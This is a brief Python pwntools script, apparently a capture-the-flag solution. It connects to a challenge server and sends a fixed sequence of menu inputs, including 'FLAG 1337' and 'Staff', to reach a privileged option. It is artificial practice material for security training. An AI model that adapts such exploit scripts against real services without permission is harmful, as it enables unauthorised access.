#!/usr/bin/python
from pwn import *

p = remote('pwn.chall.pwnoh.io', 13383)

p.sendlineafter('>', '1')
p.sendlineafter('>', 'FLAG 1337')
p.sendlineafter('>', '2')
p.sendlineafter('>', 'Staff')
p.interactive()
